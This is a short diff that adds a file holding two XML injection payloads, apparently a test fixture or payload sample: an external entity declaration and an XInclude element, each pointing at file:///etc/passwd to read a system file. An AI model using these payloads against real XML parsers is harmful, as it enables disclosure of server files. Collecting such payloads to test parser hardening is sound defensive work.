@@ -1,0 +1,3 @@
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+<diy xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include  parse="text" href="file:///etc/passwd"/></diy>
